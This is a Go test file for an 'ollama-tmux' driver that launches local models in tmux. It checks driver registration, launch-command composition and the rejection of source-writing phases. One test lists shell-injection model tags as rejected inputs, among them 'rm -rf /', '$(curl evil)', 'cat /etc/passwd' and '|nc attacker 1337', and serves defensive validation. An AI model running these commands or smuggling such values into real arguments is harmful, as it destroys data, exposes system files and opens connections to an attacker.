package bridge

import (
	"context"
	"os/exec"
	"strings"
	"testing"

	"github.com/mickeyyaya/evolve-loop/go/internal/core"
)

func TestOllamaTmux_DriverRegistered(t *testing.T) {
	d, ok := LookupDriver("ollama-tmux")
	if !ok {
		t.Fatal("ollama-tmux driver not registered (init() didn't fire?)")
	}
	if d.Name() != "ollama-tmux" {
		t.Errorf("driver.Name()=%q, want ollama-tmux", d.Name())
	}
}

func TestOllamaTmux_ManifestRealizesYoloOnly(t *testing.T) {
	intent := LaunchIntent{
		ModelTier:     "sonnet",
		Permission:    "bypass",
		SettingsScope: "user",
	}
	got := RealizeFor("ollama-tmux", intent)
	if len(got.LaunchFlags) != 1 || got.LaunchFlags[0] != "--experimental-yolo" {
		t.Errorf("ollama-tmux LaunchFlags=%v, want [--experimental-yolo] only (default_args from manifest; params still all noop except session_mode)", got.LaunchFlags)
	}
}

func TestOllamaTmux_RejectsWritePhase(t *testing.T) {
	var stderr strings.Builder
	deps := Deps{Stderr: &stderr}.withDefaults()
	cfg := &Config{
		CLI:      "ollama-tmux",
		Model:    "llama3.1:8b",
		Agent:    "build",
		Worktree: "/abs/wt/cycle-5",
	}
	rc, err := ollamaTmuxDriver{}.Launch(context.Background(), cfg, deps)
	if err == nil {
		t.Fatal("expected error on source-writing assignment; got nil")
	}
	if rc != ExitBadFlags {
		t.Errorf("rc=%d, want %d (ExitBadFlags)", rc, ExitBadFlags)
	}
	if !strings.Contains(stderr.String(), "source-writing phase") {
		t.Errorf("stderr missing the 'source-writing phase' explanation: %q", stderr.String())
	}
	// Defensive: the error message names the phase + worktree so an operator
	// auditing logs can find the misassigned phase quickly.
	msg := err.Error()
	if !strings.Contains(msg, "build") || !strings.Contains(msg, "/abs/wt/cycle-5") {
		t.Errorf("error %q should name phase + worktree", msg)
	}
}

func TestOllamaTmux_AcceptsReasoningPhase_RejectionDoesNotFire(t *testing.T) {
	// A bogus binary forces tmuxNonClaudePreflight to short-circuit before
	// launching real tmux, so only the rejection's ABSENCE is asserted here.
	var stderr strings.Builder
	deps := Deps{
		Stderr: &stderr,
		Env: map[string]string{
			"BRIDGE_TESTING":       "1",
			"BRIDGE_OLLAMA_BINARY": "/no/such/binary-for-test",
		},
	}.withDefaults()
	cfg := &Config{
		CLI:      "ollama-tmux",
		Model:    "llama3.1:8b",
		Agent:    "review",
		Worktree: "",
	}
	_, _ = ollamaTmuxDriver{}.Launch(context.Background(), cfg, deps)
	if strings.Contains(stderr.String(), "source-writing phase") {
		t.Errorf("rejection fired on a reasoning phase: %q", stderr.String())
	}
}

func TestOllamaTmux_RealCLI_BootMarkerDetected(t *testing.T) {
	if _, err := exec.LookPath("ollama"); err != nil {
		t.Skip("ollama not installed; skipping real-CLI ground-truth test")
	}
	if _, err := exec.LookPath("tmux"); err != nil {
		t.Skip("tmux not installed; skipping real-CLI ground-truth test")
	}
	// This only proves the binary is reachable; it does not invoke the driver
	// against a real model (needs a pulled model and boot time, and flakes on
	// shared hosts). The real-CLI flow runs under the real-tmux integration
	// suite (EVOLVE_BRIDGE_INTEGRATION_LIVE=1).
	d, ok := LookupDriver("ollama-tmux")
	if !ok {
		t.Fatal("ollama-tmux driver missing despite host having both binaries")
	}
	_ = d // touch to silence linter
}

func TestOllamaTmux_LaunchCmdComposition(t *testing.T) {
	cases := []struct {
		name      string
		model     string
		wantInCmd string
	}{
		{"local_default", "llama3.1:8b", "ollama run llama3.1:8b"},
		{"cloud_tag_routes_via_same_binary", "gpt-oss:120b-cloud", "ollama run gpt-oss:120b-cloud"},
		{"empty_falls_back_to_default", "", "ollama run llama3.1:8b"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cmd := ollamaComposeLaunchCmd("ollama", tc.model, nil)
			if cmd != tc.wantInCmd {
				t.Errorf("launchCmd=%q, want %q", cmd, tc.wantInCmd)
			}
		})
	}
}

func TestOllamaTmux_LaunchCmd_AppendsExtrasAfterModel(t *testing.T) {
	got := ollamaComposeLaunchCmd("ollama", "llama3.1:8b", []string{"--experimental-yolo"})
	want := "ollama run llama3.1:8b --experimental-yolo"
	if got != want {
		t.Errorf("got %q, want %q (extras must follow positional model)", got, want)
	}
	if cmd := ollamaComposeLaunchCmd("ollama", "llama3.1:8b", nil); cmd != "ollama run llama3.1:8b" {
		t.Errorf("nil extras must produce pre-fix shape; got %q", cmd)
	}
	if cmd := ollamaComposeLaunchCmd("ollama", "llama3.1:8b", []string{}); cmd != "ollama run llama3.1:8b" {
		t.Errorf("empty extras must produce pre-fix shape; got %q", cmd)
	}
	multi := ollamaComposeLaunchCmd("ollama", "m", []string{"--a", "--b", "--c"})
	if multi != "ollama run m --a --b --c" {
		t.Errorf("multi-extras: got %q, want %q", multi, "ollama run m --a --b --c")
	}
	skipped := ollamaComposeLaunchCmd("ollama", "m", []string{"--a", "", "--b"})
	if skipped != "ollama run m --a --b" {
		t.Errorf("empty-string extras must be skipped; got %q", skipped)
	}
}

func TestOllamaTmux_CompositionPinsDriverInvariant(t *testing.T) {
	got := ollamaComposeLaunchCmd("ollama", "test-model:tag", nil)
	if !strings.HasPrefix(got, "ollama run ") {
		t.Errorf("composition contract broken: %q must start with %q", got, "ollama run ")
	}
	parts := strings.Fields(got)
	if len(parts) != 3 || parts[0] != "ollama" || parts[1] != "run" || parts[2] != "test-model:tag" {
		t.Errorf("composition contract broken: parts=%v, want [ollama run test-model:tag]", parts)
	}
}

func TestOllamaTmux_RejectsShellInjectionInModelTag(t *testing.T) {
	bad := []string{
		"llama3.1:8b; rm -rf /",
		"llama3.1:8b`whoami`",
		"llama3.1:8b$(curl evil)",
		"llama3.1:8b && cat /etc/passwd",
		"llama3.1:8b|nc attacker 1337",
		"llama3.1:8b\nrm -rf /",
		"llama3.1:8b 'spaces are also unsafe'",
	}
	for _, model := range bad {
		t.Run(model, func(t *testing.T) {
			var stderr strings.Builder
			deps := Deps{Stderr: &stderr}.withDefaults()
			cfg := &Config{
				CLI:   "ollama-tmux",
				Model: model,
				Agent: "review",
			}
			rc, err := ollamaTmuxDriver{}.Launch(context.Background(), cfg, deps)
			if err == nil {
				t.Fatalf("expected error on shell-injection model tag %q", model)
			}
			if rc != ExitBadFlags {
				t.Errorf("rc=%d, want ExitBadFlags=%d", rc, ExitBadFlags)
			}
			if !strings.Contains(stderr.String(), "invalid model tag") {
				t.Errorf("stderr missing rejection: %q", stderr.String())
			}
		})
	}
}

func TestOllamaTmux_LaunchSignatureMatchesDriver(t *testing.T) {
	var _ Driver = ollamaTmuxDriver{}
	want := ollamaTmuxDriver{}.Name()
	if d, ok := LookupDriver("ollama-tmux"); ok {
		if d.Name() != want {
			t.Errorf("registry returns a different driver than the package type")
		}
	}
}

func TestOllamaTmux_WorktreeFromPhaseRequest(t *testing.T) {
	// PhaseRequest.Worktree is the non-bridge mirror of cfg.Worktree.
	var pr core.PhaseRequest
	pr.Worktree = "/abs/wt"
	if pr.Worktree == "" {
		t.Fatal("PhaseRequest.Worktree zero — guard would never fire (cross-package contract changed?)")
	}
}
